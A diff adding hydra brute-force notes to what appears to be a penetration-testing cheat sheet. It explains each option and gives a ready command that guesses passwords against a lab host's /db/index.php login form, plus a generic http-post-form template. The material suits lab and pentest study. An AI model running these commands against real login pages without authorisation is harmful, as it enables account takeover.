@@ -1,3 +1,14 @@
+I’ll run hydra with the following options:
+
+    -l muted - hydra requires a username, even if it won’t use it
+    -P [password file] - a file of passwords to try
+    https-post-form - this is the plugin to use, which takes a string with three parts, : separated:
+        /db/index.php - the path to POST to
+        password=^PASS^&remember=yes&login=Log+In&proc_login=true - the POST data, with ^PASS^ being the thing that will be replaced with words from the wordlist
+        Incorrect password - text on the response that indicates failure to login
+
+root@kali# hydra 10.10.x.x -l muted -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
+
 HTTP-Post-Form
 Bruteforce web HTTP form
 hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
